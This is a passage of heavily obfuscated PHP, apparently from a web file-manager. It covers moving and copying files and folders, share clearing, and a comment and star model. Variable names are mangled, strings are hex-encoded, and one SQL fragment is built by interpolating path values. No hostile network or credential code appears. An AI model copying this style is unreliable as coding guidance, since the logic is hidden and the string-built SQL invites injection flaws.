array(); $this->_childrenItemCache = array(); } public function move($¨üŠøˆ, $¸–Ÿ«Ç, $Œ„•±§ = REPEAT_REPLACE, $šÈ¤ëş” = '') { $äæÂßó =& $_SERVER[±³—úê]; $ğÓÀø¡µ = $this->sourceInfo($¨üŠøˆ); $´œ¯ÈÖ = $this->sourceInfo($¸–Ÿ«Ç); if ($ğÓÀø¡µ[$äæÂßó[192]] == $´œ¯ÈÖ[$äæÂßó[193]]) { if ($ğÓÀø¡µ[$äæÂßó[516]] == $äæÂßó[91]) { Model($äæÂßó[514])->restore(array($¨üŠøˆ)); } if (!$šÈ¤ëş” || $šÈ¤ëş” == $ğÓÀø¡µ[$äæÂßó[32]]) { return $¨üŠøˆ; } } $†÷·‹£ = $this->pathInfoMore($¨üŠøˆ); if ($this->isParentOf($¨üŠøˆ, $¸–Ÿ«Ç)) { return !1; } if (!$ğÓÀø¡µ || !$´œ¯ÈÖ || $´œ¯ÈÖ[$äæÂßó[496]] != $äæÂßó[91]) { return !1; } Hook::trigger($äæÂßó[672], $†÷·‹£); $this->targetIsDelete = intval($ğÓÀø¡µ[$äæÂßó[516]]); if ($ğÓÀø¡µ[$äæÂßó[192]] == $¸–Ÿ«Ç && $šÈ¤ëş” != $ğÓÀø¡µ[$äæÂßó[32]]) { $”¸Øšæí = $this->fileNameExist($¸–Ÿ«Ç, $šÈ¤ëş”); if ($”¸Øšæí && $ğÓÀø¡µ[$äæÂßó[496]] == $äæÂßó[240]) { $ã±±‰® = $this->sourceInfo($”¸Øšæí); $¶Š’˜ÚÈ = $this->fileHistory($ã±±‰®, $ğÓÀø¡µ[$äæÂßó[552]], $ğÓÀø¡µ[$äæÂßó[79]]); if (!$¶Š’˜ÚÈ) { Model($äæÂßó[555])->remove($ğÓÀø¡µ[$äæÂßó[552]]); } $this->removeNow($¨üŠøˆ, !1); $this->folderSizeReset($¸–Ÿ«Ç); Hook::trigger($äæÂßó[673], $†÷·‹£); return $”¸Øšæí; } } $ûÏ›«Õë = $šÈ¤ëş” ? $šÈ¤ëş” : $ğÓÀø¡µ[$äæÂßó[32]]; $this->lockMoveStart($¨üŠøˆ); $this->lockWriteStart($¸–Ÿ«Ç, $ûÏ›«Õë); $äƒıÑÈ» = array($äæÂßó[643] => array(), $äæÂßó[674] => !1); $this->clearShare($¨üŠøˆ, $¸–Ÿ«Ç); $”¹À¶Ë¼ = $this->fileNameExistAuto($¸–Ÿ«Ç, $ğÓÀø¡µ); $™ÊÅÆ®ß = $this->_move($¨üŠøˆ, $¸–Ÿ«Ç, $Œ„•±§, $äƒıÑÈ», $šÈ¤ëş”); $this->sourceCacheClear(); if ($ğÓÀø¡µ[$äæÂßó[496]] == $äæÂßó[91] && $”¹À¶Ë¼) { $this->folderSizeResetChildren($™ÊÅÆ®ß); } Model($äæÂßó[242])->linkAdd($äƒıÑÈ»[$äæÂßó[643]]); if ($™ÊÅÆ®ß && $”¹À¶Ë¼ && $äƒıÑÈ»[$äæÂßó[674]]) { $«ßøó = $ğÓÀø¡µ[$äæÂßó[496]] == $äæÂßó[91] ? $this->_childrenListSelect($¨üŠøˆ) : !1; $ûÃ¬Ä‹’ = $«ßøó && count($«ßøó) > 0 ? !0 : !1; $this->removeNow($¨üŠøˆ, $ûÃ¬Ä‹’); } $this->lockMoveEnd($¨üŠøˆ); $this->lockWriteEnd($¸–Ÿ«Ç, $ûÏ›«Õë); $this->folderSizeReset($ğÓÀø¡µ[$äæÂßó[192]]); $this->folderSizeReset($¸–Ÿ«Ç); $Ÿò›Ì†Å = array($ğÓÀø¡µ[$äæÂßó[192]], $¸–Ÿ«Ç); if ($ğÓÀø¡µ[$äæÂßó[496]] == $äæÂßó[91]) { $Ÿò›Ì†Å[] = $¨üŠøˆ; } $this->updateModifyTime($Ÿò›Ì†Å); Model($äæÂßó[647])->eventMove($¨üŠøˆ, $ğÓÀø¡µ[$äæÂßó[192]], $¸–Ÿ«Ç); Hook::trigger($äæÂßó[673], $†÷·‹£); return $™ÊÅÆ®ß; } private function _move($ó‚–ÑÄ, $ÁÈôÛÍê, $øÓÃËå, &$ÂéÓø„Ú, $úå•ÃÉæ = '') { $ˆÂ£³äî =& $_SERVER[±³—úê]; $²œ›¦ = $this->sourceInfo($ó‚–ÑÄ); $Ä°Â¤‰ = $²œ›¦[$ˆÂ£³äî[496]] == $ˆÂ£³äî[91]; $Ã¿ÑŠö = $úå•ÃÉæ ? $úå•ÃÉæ : $²œ›¦[$ˆÂ£³äî[32]]; $×ı»ñˆŞ = $this->fileNameExistAuto($ÁÈôÛÍê, $²œ›¦); $this->lockMoveStart($ó‚–ÑÄ); $this->lockWriteStart($ÁÈôÛÍê, $Ã¿ÑŠö); if (!$×ı»ñˆŞ) { return $this->_moveForce($ó‚–ÑÄ, $ÁÈôÛÍê, $Ã¿ÑŠö); } $•®é·Ê² = $×ı»ñˆŞ; $´ÕÄèòÕ = !1; if ($Ä°Â¤‰) { if ($øÓÃËå == REPEAT_RENAME_FOLDER) { $Ã¿ÑŠö = $this->fileNameAuto($ÁÈôÛÍê, $Ã¿ÑŠö, $øÓÃËå, $Ä°Â¤‰); $•®é·Ê² = $this->_moveForce($ó‚–ÑÄ, $ÁÈôÛÍê, $Ã¿ÑŠö); } else { $…ö›„¥ = $this->_childrenListSelect($ó‚–ÑÄ); foreach ($…ö›„¥ as $ˆ‹†Ğ†š) { $ïÜğÃ¡Ê = REPEAT_REPLACE; $this->_move($ˆ‹†Ğ†š[$ˆÂ£³äî[193]], $×ı»ñˆŞ, $ïÜğÃ¡Ê, $ÂéÓø„Ú); } $´ÕÄèòÕ = !0; } } else { if ($øÓÃËå == REPEAT_RENAME || $øÓÃËå == REPEAT_RENAME_FOLDER) { $Ã¿ÑŠö = $this->fileNameAuto($ÁÈôÛÍê, $Ã¿ÑŠö, $øÓÃËå, $Ä°Â¤‰); $•®é·Ê² = $this->_moveForce($ó‚–ÑÄ, $ÁÈôÛÍê, $Ã¿ÑŠö); } else { $¥’ÎÁé = $this->sourceInfoCache($×ı»ñˆŞ); $Ûª¯áÇ” = $this->fileHistory($¥’ÎÁé, $²œ›¦[$ˆÂ£³äî[552]], $²œ›¦[$ˆÂ£³äî[79]]); if ($Ûª¯áÇ”) { $ÂéÓø„Ú[$ˆÂ£³äî[643]][] = $²œ›¦[$ˆÂ£³äî[552]]; } $´ÕÄèòÕ = !0; } } if ($´ÕÄèòÕ) { $ÂéÓø„Ú[$ˆÂ£³äî[674]] = !0; } return $•®é·Ê²; } private function _moveForce($×ª¦ªáÜ, $„²­’‹, $µšİ½´È) { $òß¤ü£¥ =& $_SERVER[±³—úê]; $Íıò¬“ = $this->sourceInfo($×ª¦ªáÜ); $Ó‘İş³¹ = $this->sourceInfo($„²­’‹); $üØßğìğ = $Íıò¬“[$òß¤ü£¥[496]] == $òß¤ü£¥[91]; $—Í¯Íè‹ = array($òß¤ü£¥[488] => $Ó‘İş³¹[$òß¤ü£¥[193]], $òß¤ü£¥[666] => $Ó‘İş³¹[$òß¤ü£¥[595]] . $Ó‘İş³¹[$òß¤ü£¥[193]] . $òß¤ü£¥[50], $òß¤ü£¥[662] => $Ó‘İş³¹[$òß¤ü£¥[190]], $òß¤ü£¥[663] => $Ó‘İş³¹[$òß¤ü£¥[580]], $òß¤ü£¥[665] => USER_ID, $òß¤ü£¥[505] => $µšİ½´È); $ƒŒ¥ˆÔ = $Íıò¬“[$òß¤ü£¥[190]] == SourceModel::TYPE_GROUP && $Ó‘İş³¹[$òß¤ü£¥[190]] == SourceModel::TYPE_GROUP && $Íıò¬“[$òß¤ü£¥[580]] == $Ó‘İş³¹[$òß¤ü£¥[580]]; if (!$ƒŒ¥ˆÔ && $this->moveClearAuth) { Model($òß¤ü£¥[578])->authClear($×ª¦ªáÜ); } $ñÇŞ—– = $Íıò¬“[$òß¤ü£¥[516]] == $òß¤ü£¥[91] && $Ó‘İş³¹[$òß¤ü£¥[516]] != $òß¤ü£¥[91]; if ($ñÇŞ—–) { $—Í¯Íè‹[$òß¤ü£¥[515]] = 0; } if ($üØßğìğ) { $šç€Â… = array($òß¤ü£¥[666] => array($òß¤ü£¥[626], $Íıò¬“[$òß¤ü£¥[595]] . $Íıò¬“[$òß¤ü£¥[193]] . $òß¤ü£¥[627])); $«Ù³†ûš = $Íıò¬“[$òß¤ü£¥[595]] . $Íıò¬“[$òß¤ü£¥[193]] . $òß¤ü£¥[50]; $ÁÈùíÒŒ = $Ó‘İş³¹[$òß¤ü£¥[595]] . $Ó‘İş³¹[$òß¤ü£¥[193]] . $òß¤ü£¥[50] . $Íıò¬“[$òß¤ü£¥[193]] . $òß¤ü£¥[50]; $„ŠşÔ› = array($òß¤ü£¥[666] => array($òß¤ü£¥[675], "\x72\x65\x70\x6c\141\x63\145\x28\x70\x61\162\x65\156\164\x4c\x65\x76\x65\x6c\x2c\47{$«Ù³†ûš}\47\54\47{$ÁÈùíÒŒ}\47\x29"), $òß¤ü£¥[662] => $Ó‘İş³¹[$òß¤ü£¥[190]], $òß¤ü£¥[663] => $Ó‘İş³¹[$òß¤ü£¥[580]]); if ($ñÇŞ—–) { $„ŠşÔ›[$òß¤ü£¥[515]] = 0; } $this->where($šç€Â…)->data($„ŠşÔ›)->save(); } $this->where(array($òß¤ü£¥[502] => $×ª¦ªáÜ))->data($—Í¯Íè‹)->save(); return $×ª¦ªáÜ; } private function clearShare($ŠÉ–Ó¦, $ß¥ĞîÛ¿) { $ÍÀÚ‡äû =& $_SERVER[±³—úê]; $ëåØ›˜ = $this->sourceInfo($ŠÉ–Ó¦); $ùÂÙÎğ§ = $this->sourceInfo($ß¥ĞîÛ¿); if ($ëåØ›˜[$ÍÀÚ‡äû[580]] == $ùÂÙÎğ§[$ÍÀÚ‡äû[580]] && $ëåØ›˜[$ÍÀÚ‡äû[190]] == $ÍÀÚ‡äû[676]) { return; } $©É…ú³é = array($ÍÀÚ‡äû[595] => array($ÍÀÚ‡äû[626], $ëåØ›˜[$ÍÀÚ‡äû[595]] . $ŠÉ–Ó¦ . $ÍÀÚ‡äû[627])); $ÇÉ‰†ËÊ = $this->field($ÍÀÚ‡äû[502])->where($©É…ú³é)->getField($ÍÀÚ‡äû[193], !0); if (!$ÇÉ‰†ËÊ) { return; } $©É…ú³é = array($ÍÀÚ‡äû[193] => array($ÍÀÚ‡äû[7], $ÇÉ‰†ËÊ), $ÍÀÚ‡äû[677] => 1); $‹×†§“ = Model($ÍÀÚ‡äû[678])->field($ÍÀÚ‡äû[679])->where($©É…ú³é)->select(); if (!$‹×†§“) { return; } $‹×†§“ = array_to_keyvalue($‹×†§“, $ÍÀÚ‡äû[12], $ÍÀÚ‡äû[679]); $©É…ú³é = array($ÍÀÚ‡äû[679] => array($ÍÀÚ‡äû[7], $‹×†§“)); Model($ÍÀÚ‡äû[678])->where($©É…ú³é)->save(array($ÍÀÚ‡äû[677] => 0)); Model($ÍÀÚ‡äû[680])->where($©É…ú³é)->delete(); } public function copyFolderFromIO($¼ş¶¸¥Ö, $ÕÔí÷»ƒ, $¿§á…¼Ê, $ŒéìèÖ, $û¢µú«­, $¹Õˆâñ¨ = false) { $ì¸„”·à =& $_SERVER[±³—úê]; $ù¸İîÖ = array($ì¸„”·à[644] => array(), $ì¸„”·à[645] => array(), $ì¸„”·à[643] => array(), $ì¸„”·à[681] => array()); $ŠüÏ¼Ş¯ = $¹Õˆâñ¨ ? $¹Õˆâñ¨ : $¼ş¶¸¥Ö->pathThis($ÕÔí÷»ƒ); $ÚÀ«¥ñü = $this->fileNameExist($¿§á…¼Ê, $ŠüÏ¼Ş¯); $óîÏ¦ïÜ = $this->mkdir($¿§á…¼Ê, $ŠüÏ¼Ş¯, $ŒéìèÖ); if (!$ÚÀ«¥ñü || $ŒéìèÖ == REPEAT_RENAME_FOLDER) { $ŒéìèÖ = !1; } if ($ÚÀ«¥ñü) { $this->_childrenAllMake($ÚÀ«¥ñü); } Hook::trigger($ì¸„”·à[682]); $this->_copyChildTo($¼ş¶¸¥Ö, $ÕÔí÷»ƒ, $óîÏ¦ïÜ, $ŒéìèÖ, $ù¸İîÖ, $û¢µú«­); Hook::trigger($ì¸„”·à[683]); if ($óîÏ¦ïÜ) { $this->folderSizeResetChildren($óîÏ¦ïÜ); } $this->_childrenListClear(); Model($ì¸„”·à[646])->addAll($ù¸İîÖ[$ì¸„”·à[644]], array(), !0); Model($ì¸„”·à[647])->eventCopy($óîÏ¦ïÜ); $this->saveAll($ù¸İîÖ[$ì¸„”·à[645]]); Model($ì¸„”·à[555])->linkAdd($ù¸İîÖ[$ì¸„”·à[643]]); Model($ì¸„”·à[555])->remove($ù¸İîÖ[$ì¸„”·à[681]]); $this->folderSizeReset($¿§á…¼Ê); $this->updateModifyTime($¿§á…¼Ê); return $óîÏ¦ïÜ; } private function _copyChildTo($½µÂİ†Õ, $­‡û±üÌ, $¿ÛœÃîÙ, $’³Ó°›è, &$Ö¾Ù‚©Æ, $™“…ëø„) { $¬’¤®İÂ =& $_SERVER[±³—úê]; $³¿Ë¢îÕ = $this->sourceInfoCache($¿ÛœÃîÙ); $µìŞ‰İ = $½µÂİ†Õ->listPath($­‡û±üÌ); $µìŞ‰İ = $µìŞ‰İ ? $µìŞ‰İ : array($¬’¤®İÂ[86] => array(), $¬’¤®İÂ[85] => array()); $†¸¤Æ÷¶ = array_merge($µìŞ‰İ[$¬’¤®İÂ[86]], $µìŞ‰İ[$¬’¤®İÂ[85]]); $Õ„»‰öˆ = $this->_addFiles($½µÂİ†Õ, $µìŞ‰İ[$¬’¤®İÂ[86]], $™“…ëø„); $¯»œ¥ä¥ = array(); foreach ($†¸¤Æ÷¶ as &$èÏƒ¿¤œ) { if (isset($Õ„»‰öˆ[$èÏƒ¿¤œ[$¬’¤®İÂ[32]]])) { $èÏƒ¿¤œ = $Õ„»‰öˆ[$èÏƒ¿¤œ[$¬’¤®İÂ[32]]]; } $èÏƒ¿¤œ[$¬’¤®İÂ[496]] = $èÏƒ¿¤œ[$¬’¤®İÂ[33]] == $¬’¤®İÂ[78]; $èÏƒ¿¤œ[$¬’¤®İÂ[497]] = substr(_get($èÏƒ¿¤œ, $¬’¤®İÂ[169], $¬’¤®İÂ[12]), 0, 10); $èÏƒ¿¤œ[$¬’¤®İÂ[79]] = _get($èÏƒ¿¤œ, $¬’¤®İÂ[79], 0); $èÏƒ¿¤œ[$¬’¤®İÂ[552]] = _get($èÏƒ¿¤œ, $¬’¤®İÂ[552], 0); if (!isset($èÏƒ¿¤œ[$¬’¤®İÂ[684]]) && $èÏƒ¿¤œ[$¬’¤®İÂ[552]]) { $Ö¾Ù‚©Æ[$¬’¤®İÂ[681]][] = $èÏƒ¿¤œ[$¬’¤®İÂ[552]]; } if ($’³Ó°›è) { $Å ÈîáĞ = $this->fileNameExistCache($¿ÛœÃîÙ, $èÏƒ¿¤œ[$¬’¤®İÂ[32]]); if ($Å ÈîáĞ) { if ($èÏƒ¿¤œ[$¬’¤®İÂ[496]] || $’³Ó°›è == REPEAT_SKIP) { continue; } if ($’³Ó°›è == REPEAT_REPLACE) { $ì×ß•˜ = $this->sourceInfoCache($Å ÈîáĞ); $ÔñÙÎÜØ = $this->fileHistory($ì×ß•˜, $èÏƒ¿¤œ[$¬’¤®İÂ[552]], $èÏƒ¿¤œ[$¬’¤®İÂ[79]]); if ($ÔñÙÎÜØ) { $Ö¾Ù‚©Æ[$¬’¤®İÂ[643]][] = $èÏƒ¿¤œ[$¬’¤®İÂ[552]]; } continue; } else { if ($’³Ó°›è == REPEAT_RENAME) { $èÏƒ¿¤œ[$¬’¤®İÂ[32]] = $this->fileNameAutoCache($¿ÛœÃîÙ, $èÏƒ¿¤œ[$¬’¤®İÂ[32]], $’³Ó°›è, !1); } } } } if (!$èÏƒ¿¤œ[$¬’¤®İÂ[496]] && $èÏƒ¿¤œ[$¬’¤®İÂ[552]] == 0) { continue; } if (!$èÏƒ¿¤œ[$¬’¤®İÂ[496]] && $èÏƒ¿¤œ[$¬’¤®İÂ[552]]) { $Ö¾Ù‚©Æ[$¬’¤®İÂ[643]][] = $èÏƒ¿¤œ[$¬’¤®İÂ[552]]; } $¯»œ¥ä¥[] = $this->_makeItemData($èÏƒ¿¤œ, $³¿Ë¢îÕ, $èÏƒ¿¤œ[$¬’¤®İÂ[32]]); } unset($èÏƒ¿¤œ); if (!empty($¯»œ¥ä¥)) { $this->addAll($¯»œ¥ä¥); $this->_childrenListSelect($¿ÛœÃîÙ); } $Šæˆ¬ = $this->_childrenList($¿ÛœÃîÙ); $Šæˆ¬ = array_to_keyvalue($Šæˆ¬, $¬’¤®İÂ[32]); foreach ($†¸¤Æ÷¶ as $èÏƒ¿¤œ) { $ì×ß•˜ = $Šæˆ¬[$èÏƒ¿¤œ[$¬’¤®İÂ[32]]]; $Úó‡ Ã„ = $ì×ß•˜[$¬’¤®İÂ[193]]; $this->_copyApplyMeta($ì×ß•˜, $Ö¾Ù‚©Æ); if ($èÏƒ¿¤œ[$¬’¤®İÂ[33]] == $¬’¤®İÂ[78]) { $èÏƒ¿¤œ[$¬’¤®İÂ[87]] = $½µÂİ†Õ->getPathInner($èÏƒ¿¤œ[$¬’¤®İÂ[87]]); $this->_copyChildTo($½µÂİ†Õ, $èÏƒ¿¤œ[$¬’¤®İÂ[87]], $Úó‡ Ã„, $’³Ó°›è, $Ö¾Ù‚©Æ, $™“…ëø„); } } } private function _addFiles($èø±ÍÅú, $ß’°ÁÓ, $ÜÂïäÆ”) { $†å…ˆØ„ =& $_SERVER[±³—úê]; if (!$ß’°ÁÓ || count($ß’°ÁÓ) == 0) { return array(); } $”Ìõáó© = array(); foreach ($ß’°ÁÓ as &$ˆóñŸ´¿) { Hook::trigger($†å…ˆØ„[685], $ˆóñŸ´¿); $ˆóñŸ´¿[$†å…ˆØ„[87]] = $èø±ÍÅú->getPathInner($ˆóñŸ´¿[$†å…ˆØ„[87]]); $ñ×îæ = $èø±ÍÅú->hashSimple($ˆóñŸ´¿[$†å…ˆØ„[87]]); $çÊú¯¸æ = $èø±ÍÅú->hashMd5($ˆóñŸ´¿[$†å…ˆØ„[87]]); if (strlen($çÊú¯¸æ) > 10 && !isset($”Ìõáó©[$çÊú¯¸æ])) { $”Ìõáó©[$çÊú¯¸æ] = array(); } $ˆóñŸ´¿[$†å…ˆØ„[686]] = $ñ×îæ; $ˆóñŸ´¿[$†å…ˆØ„[558]] = $çÊú¯¸æ; $”Ìõáó©[$çÊú¯¸æ][] =& $ˆóñŸ´¿; if (count($”Ìõáó©[$çÊú¯¸æ]) > 1) { $ˆóñŸ´¿[$†å…ˆØ„[684]] = !0; } Hook::trigger($†å…ˆØ„[687], $ˆóñŸ´¿); } unset($ˆóñŸ´¿); $ã¬ÁÓ÷ = array($†å…ˆØ„[558] => array($†å…ˆØ„[7], array_keys($”Ìõáó©))); $¾’ùÕôñ = Model($†å…ˆØ„[688]); $ıåß¥‚Í = $¾’ùÕôñ->where($ã¬ÁÓ÷)->select(); $ıåß¥‚Í = $ıåß¥‚Í ? $ıåß¥‚Í : array(); foreach ($ıåß¥‚Í as $àó„•°›) { if (!isset($”Ìõáó©[$àó„•°›[$†å…ˆØ„[558]]])) { continue; } $Ù·¯Ö“ó = $”Ìõáó©[$àó„•°›[$†å…ˆØ„[558]]]; foreach ($Ù·¯Ö“ó as &$ˆóñŸ´¿) { $ˆóñŸ´¿[$†å…ˆØ„[552]] = $àó„•°›[$†å…ˆØ„[552]]; $ˆóñŸ´¿[$†å…ˆØ„[684]] = !0; } unset($ˆóñŸ´¿); } $«Õğ§ù = array(); foreach ($ß’°ÁÓ as $Ö»¸âÚ) { Hook::trigger($†å…ˆØ„[689], $Ö»¸âÚ); if (isset($Ö»¸âÚ[$†å…ˆØ„[684]]) && $Ö»¸âÚ[$†å…ˆØ„[684]]) { Hook::trigger($†å…ˆØ„[690], $Ö»¸âÚ); continue; } $¡«¾¡ºŠ = $èø±ÍÅú->getPathInner($Ö»¸âÚ[$†å…ˆØ„[87]]); $Û„äß® = $¾’ùÕôñ->addFileMake($¡«¾¡ºŠ, $Ö»¸âÚ[$†å…ˆØ„[79]], $Ö»¸âÚ[$†å…ˆØ„[686]], $Ö»¸âÚ[$†å…ˆØ„[558]], $Ö»¸âÚ[$†å…ˆØ„[32]], $ÜÂïäÆ”); Hook::trigger($†å…ˆØ„[690], $Ö»¸âÚ); if (!is_array($Û„äß®)) { continue; } $«Õğ§ù[] = $Û„äß®; } $¾’ùÕôñ->addAll($«Õğ§ù); $ã¬ÁÓ÷ = array($†å…ˆØ„[558] => array($†å…ˆØ„[7], array_keys($”Ìõáó©))); $ıåß¥‚Í = $¾’ùÕôñ->where($ã¬ÁÓ÷)->select(); $ıåß¥‚Í = $ıåß¥‚Í ? $ıåß¥‚Í : array(); foreach ($ıåß¥‚Í as $àó„•°›) { if (!isset($”Ìõáó©[$àó„•°›[$†å…ˆØ„[558]]])) { continue; } $øÒæĞ«Î =& $”Ìõáó©[$àó„•°›[$†å…ˆØ„[558]]]; foreach ($øÒæĞ«Î as &$ˆóñŸ´¿) { $ˆóñŸ´¿[$†å…ˆØ„[552]] = $àó„•°›[$†å…ˆØ„[552]]; } unset($ˆóñŸ´¿); } $é¸ÆßïÂ = array(); foreach ($ß’°ÁÓ as $Â›œÑÙ) { $é¸ÆßïÂ[$Â›œÑÙ[$†å…ˆØ„[32]]] = $Â›œÑÙ; } return $é¸ÆßïÂ; } } define($_SERVER[±³—úê][691], $_SERVER[±³—úê][692]); goto fÉµÖ¶ƒó; eÃ¯¼¤ÖÎ: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\145\x6e\x74"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\141\x6d\145" => "\x63\157\155\155\145\x6e\164\x5f\x6d\145\164\141", "\155\145\164\x61\106\151\x65\x6c\144" => "\143\x6f\x6d\x6d\145\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($îÇÑÎ”å) { $‘Ûì¶Œ =& $_SERVER[±³—úê]; if ($îÇÑÎ”å[$‘Ûì¶Œ[2004]]) { $¶Ô¾º…ˆ = $this->where(array($‘Ûì¶Œ[2005] => $îÇÑÎ”å[$‘Ûì¶Œ[2004]]))->find(); if (!$¶Ô¾º…ˆ || $¶Ô¾º…ˆ[$‘Ûì¶Œ[190]] != $îÇÑÎ”å[$‘Ûì¶Œ[190]] || $¶Ô¾º…ˆ[$‘Ûì¶Œ[580]] != $îÇÑÎ”å[$‘Ûì¶Œ[580]]) { return !1; } $this->where(array($‘Ûì¶Œ[2005] => $îÇÑÎ”å[$‘Ûì¶Œ[2004]]))->setAdd($‘Ûì¶Œ[2006], 1); } $îÇÑÎ”å[$‘Ûì¶Œ[2007]] = 0; $îÇÑÎ”å[$‘Ûì¶Œ[2006]] = 0; $îÇÑÎ”å[$‘Ûì¶Œ[830]] = 1; return $this->add($îÇÑÎ”å); } public function commentCount($ÊÚ´ÇíÂ, $¯¦†Œ‹Ù, $·†”ìÜ‘ = false) { $ğ¤Û¡ø =& $_SERVER[±³—úê]; if (!$ÊÚ´ÇíÂ) { return array(); } if (is_string($ÊÚ´ÇíÂ) || is_int($ÊÚ´ÇíÂ)) { $ÊÚ´ÇíÂ = array($ÊÚ´ÇíÂ); } $²ÅÊÊ¾· = array($ğ¤Û¡ø[580], $ğ¤Û¡ø[2008] => $ğ¤Û¡ø[576]); $¿í‘È”ş = array($ğ¤Û¡ø[580] => array($ğ¤Û¡ø[7], $ÊÚ´ÇíÂ), $ğ¤Û¡ø[190] => $¯¦†Œ‹Ù); if ($·†”ìÜ‘) { $¿í‘È”ş[$ğ¤Û¡ø[1775]] = $·†”ìÜ‘; } $Ú »°Ú° = $this->field($²ÅÊÊ¾·)->where($¿í‘È”ş)->group($ğ¤Û¡ø[580])->select(); return array_to_keyvalue($Ú »°Ú°, $ğ¤Û¡ø[580], $ğ¤Û¡ø[576]); } public function starTarget($ğÌê‹£, $‹æ¿²ÚÙ) { $ÅñÖŠÔ =& $_SERVER[±³—úê]; $¤“Ù§èØ = $ğÌê‹£ + self::TYPE_STAR_OFFSET; $æü’Õİ³ = array($ÅñÖŠÔ[1775] => USER_ID, $ÅñÖŠÔ[190] => $¤“Ù§èØ, $ÅñÖŠÔ[580] => $‹æ¿²ÚÙ); $ß½Ù¡¡ = $this->where($æü’Õİ³)->find(); if ($ß½Ù¡¡) { return $this->where(array($ÅñÖŠÔ[486] => $ß½Ù¡¡[$ÅñÖŠÔ[486]]))->delete(); } $èòÓô´ = array($ÅñÖŠÔ[2004] => 0, $ÅñÖŠÔ[1775] => USER_ID, $ÅñÖŠÔ[830] => 1, $ÅñÖŠÔ[171] => $ÅñÖŠÔ[12], $ÅñÖŠÔ[190] => $¤“Ù§èØ, $ÅñÖŠÔ[580] => $‹æ¿²ÚÙ, $ÅñÖŠÔ[2007] => 0, $ÅñÖŠÔ[2006] => 0); return $this->add($èòÓô´); } public function starTargetCount($ò€²½Ç“, $´­º¾Í) { $ªÖÄ®°¬ =& $_SERVER[±³—úê]; $î‘•ƒ÷œ = $´­º¾Í + self::TYPE_STAR_OFFSET; $î”íº¨ = $this->commentCount($ò€²½Ç“, $î‘•ƒ÷œ); $îªùÍâÛ = $this->commentCount($ò€²½Ç“, $î‘•ƒ÷œ, USER_ID); return array($ªÖÄ®°¬[2009] => $î”íº¨, $ªÖÄ®°¬[2010] => $îªùÍâÛ); } public function starTargetUserList($·•¢›íĞ, $›İ»Ù…¬) { $®òÜ±‰ú =& $_SERVER[±³—úê]; $Èëá££Ó = $·•¢›íĞ + self::TYPE_STAR_OFFSET; $Ÿôé…üâ = array($®òÜ±‰ú[580] => $›İ»Ù…¬, $®òÜ±‰ú[190] => $Èëá££Ó); $—î­î¸ê = $this->where($Ÿôé…üâ)->count(); $úİ·ùŒ = array($®òÜ±‰ú[343] => $—î­î¸ê, $®òÜ±‰ú[2011] => array()); if (!$—î­î¸ê) { return $úİ·ùŒ; } $£Ô´Ïô£ = $this->field($®òÜ±‰ú[1775])->where($Ÿôé…üâ)->limit(500)->select(); $£Ô´Ïô£ = array_to_keyvalue($£Ô´Ïô£, $®òÜ±‰ú[12], $®òÜ±‰ú[1775]); $úİ·ùŒ[$®òÜ±‰ú[2011]] = Model($®òÜ±‰ú[588])->userListInfo($£Ô´Ïô£); return $úİ·ùŒ; } public function prasiseUserList($©™ß½ÂÊ) { $”„è¦‘× =& $_SERVER[±³—úê]; $–Êüâ”£ = array($”„è¦‘×[2012] => $©™ß½ÂÊ); $©«¿”ğ“ = $this->where($–Êüâ”£)->find(); $’Ğ«³ä“ = _get($©«¿”ğ“, $”„è¦‘×[2007], 0); $Ä°‘ØĞ = array($”„è¦‘×[343] => $’Ğ«³ä“, $”„è¦‘×[2011] => array()); if (!$’Ğ«³ä“) { return $Ä°‘ØĞ; } $óÎ’ÃÍ = Model($”„è¦‘×[2013])->field($”„è¦‘×[1775])->where($–Êüâ”£)->limit(500)->select(); $óÎ’ÃÍ = array_to_keyvalue($óÎ’ÃÍ, $”„è¦‘×[12], $”„è¦‘×[1775]); $Ä°‘ØĞ[$”„è¦‘×[2011]] = Model($”„è¦‘×[588])->userListInfo($óÎ’ÃÍ); return $Ä°‘ØĞ; } public function remove($î¦¨Âº) { $š°ù™ØÖ =& $_SERVER[±³—úê]; $û‘’ìÀ = array($š°ù™ØÖ[2005] => $î¦¨Âº); $ùÑªù ù = $this->where($û‘’ìÀ)->find(); if ($ùÑªù ù[$š°ù™ØÖ[2004]]) { $this->where(array($š°ù™ØÖ[2005] => $ùÑªù ù[$š°ù™ØÖ[2004]]))->setAdd($š°ù™ØÖ[2006], -1); } return $this->where($û‘’ìÀ)->delete(); } public function edit($Âµ¿¬ˆã, $˜Äø“è) { $È…Ëü¨º =& $_SERVER[±³—úê]; $ÎÍĞÏˆÙ = array($È…Ëü¨º[2005] => $Âµ¿¬ˆã); return $this->where($ÎÍĞÏˆÙ)->save(array($È…Ëü¨º[2014] => $˜Äø“è)); } public function prasise($·½†Ÿ˜ì) { $É²˜‚„ =& $_SERVER[±³—úê]; $ÁÕÇÌ¡ = Model($É²˜‚„[2015]); $Äƒ¨’ıÆ = array($É²˜‚„[2005] => $·½†Ÿ˜ì, $É²˜‚„[1766] => USER_ID); $‚¸’Ö = $ÁÕÇÌ¡->where($Äƒ¨’ıÆ)->find(); if (!$‚¸’Ö) { $ÁÕÇÌ¡->add($Äƒ¨’ıÆ); $ææ¡™ÖÔ = $this->where(array($É²˜‚„[2005] => $·½†Ÿ˜ì))->setAdd($É²˜‚„[2007], 1); } else { $ÁÕÇÌ¡->where($Äƒ¨’ıÆ)->delete(); $ææ¡™ÖÔ = $this->where(array($É²˜‚„[2005] => $·½†Ÿ˜ì))->setAdd($É²˜‚„[2007], -1); } return $ææ¡™ÖÔ; } public function targetInfo($à«†·÷¹, $œŸ™Ì¼Ç) { $×Øó—œ€ =& $_SERVER[±³—úê]; $û™Ş“®° = array($×Øó—œ€[662] => $à«†·÷¹, $×Øó—œ€[663] => $œŸ™Ì¼Ç); $”¨£ßË¸ = $this->where($û™Ş“®°)->count(); $Âºú¦¡ = 